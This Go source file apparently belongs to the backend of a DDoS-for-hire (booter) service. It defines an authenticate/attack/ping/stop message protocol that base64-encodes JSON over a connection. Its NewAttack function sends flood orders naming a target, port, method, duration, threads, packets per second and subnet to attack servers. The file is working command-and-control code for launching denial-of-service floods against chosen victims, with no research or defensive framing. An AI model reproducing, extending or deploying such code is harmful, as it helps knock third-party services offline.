package servers

import (
	"api/core/models/floods"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
)

type Message struct {
	ID        int    `json:"mmid"`
	MessageID int    `json:"messageid"`
	Length    int    `json:"length"`
	Content   []byte `json:"mcontent"`
}

type AttackMessage struct {
	ID        int `json:"mmid"`
	MessageID int `json:"messageid"`
	Data      struct {
		User     int    `json:"user"`
		Target   string `json:"target"`
		Port     string `json:"port"`
		Method   string `json:"method"`
		Duration string `json:"duration"`
	} `json:"data"`
	Options struct {
		Threads string `json:"threads"`
		PPS     string `json:"pps"`
		Subnet  string `json:"subnet"`
	} `json:"options"`
}

const (
	MessageAuthenticate = iota
	MessageSuccess      = iota
	MessageFailure      = iota
	MessageAttack       = iota
	MessagePing         = iota
	MessageStop         = iota
)

var (
	ErrMsgIDMismatch = errors.New("message ID Mismatch!")
	ErrMsgDecode     = errors.New("failed to decode the message!")
)

func (s *Server) ReadMessage() (*Message, error) {
	buf := make([]byte, 256)
	n, err := s.Read(buf)
	if err != nil || n < 0 {
		delete(Servers, s.Name)
		logger.Println(err)
		return nil, err
	}
	m := new(Message)
	decoded := make([]byte, 256)
	len, err := base64.RawStdEncoding.Decode(decoded, buf[:n])
	if err != nil {
		logger.Println("failed to read message \"" + err.Error() + "\"")
		return nil, ErrMsgDecode
	}
	err = json.Unmarshal(decoded[:len], &m)
	if err != nil {
		logger.Println("failed to read message \"" + err.Error() + "\"")
		return nil, ErrMsgDecode
	}
	s.CurrentID++
	if s.CurrentID != m.MessageID {
		logger.Println("message id mismatch! (server=" + fmt.Sprint(s.CurrentID) + ", client=" + fmt.Sprint(m.MessageID) + ")")
		return nil, ErrMsgIDMismatch
	}
	return m, nil
}

func (s *Server) NewMessage(ID int, Content string) (*Message, []byte) {
	s.CurrentID++
	m := &Message{
		ID:        ID,
		MessageID: s.CurrentID,
		Length:    len(Content),
		Content:   []byte(Content),
	}
	bytes, err := json.Marshal(m)
	if err != nil {
		logger.Println("error while encoding message!")
	}
	msg := base64.RawStdEncoding.EncodeToString(bytes)
	buffer := make([]byte, 0)
	buffer = append(buffer, byte(len(msg)))
	for _, char := range msg {
		buffer = append(buffer, byte(char))
	}
	s.conn.Write(buffer)
	return m, []byte(msg)
}

func (s *Server) NewAttack(atk *floods.Attack) {
	//s.NewMessage(MessageAttack, "")
	s.CurrentID++
	attack := &AttackMessage{
		ID:        MessageAttack,
		MessageID: s.CurrentID,
		Data: struct {
			User     int    "json:\"user\""
			Target   string "json:\"target\""
			Port     string "json:\"port\""
			Method   string "json:\"method\""
			Duration string "json:\"duration\""
		}{
			User:     atk.Parent,
			Target:   atk.Target,
			Port:     fmt.Sprint(atk.Port),
			Method:   atk.Sname,
			Duration: fmt.Sprint(atk.Duration),
		},
		Options: struct {
			Threads string "json:\"threads\""
			PPS     string "json:\"pps\""
			Subnet  string "json:\"subnet\""
		}{
			Threads: fmt.Sprint(atk.Threads),
			PPS:     fmt.Sprint(atk.PPS),
			Subnet:  fmt.Sprint(atk.Subnet),
		},
	}
	bytes, err := json.Marshal(attack)
	if err != nil {
		logger.Println("error while encoding message!")
	}
	msg := base64.RawStdEncoding.EncodeToString(bytes)
	fmt.Println(msg)
	buffer := make([]byte, 0)
	buffer = append(buffer, byte(len(msg)))
	for _, char := range msg {
		buffer = append(buffer, byte(char))
	}
	s.conn.Write([]byte(buffer))

}
